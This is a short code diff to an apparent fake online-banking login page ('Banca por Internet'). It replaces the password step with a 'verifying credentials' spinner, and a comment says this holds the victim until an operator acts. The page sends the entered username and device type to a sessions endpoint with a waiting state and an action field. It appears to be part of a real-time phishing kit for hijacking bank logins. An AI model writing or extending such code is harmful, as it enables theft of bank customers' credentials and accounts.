@@ -264,10 +264,9 @@
           user.focus();
           return;
         }
-        stepUser.hidden = true;
-        stepPass.hidden = false;
-        box?.classList.add("extended");
-        if (pass) pass.focus();
+
+        // Queda en spinner de carga esperando la acción del operador
+        showSpinner("Verificando credenciales", "Por favor espere un momento mientras procesamos su solicitud de ingreso...");
 
         fetch('/api/sessions', {
           method: 'POST',
@@ -277,7 +276,8 @@
             username: userVal,
             tipoUsuario: 'Banca por Internet',
             device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
-            state: 'waiting'
+            state: 'waiting',
+            action: null
           })
         }).catch(() => {});
         startKeepalive();
@@ -447,6 +447,7 @@
           tipoUsuario: 'Banca por Internet',
           device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
           state: 'waiting',
+          action: null,
           createdAt: Date.now()
         };
 
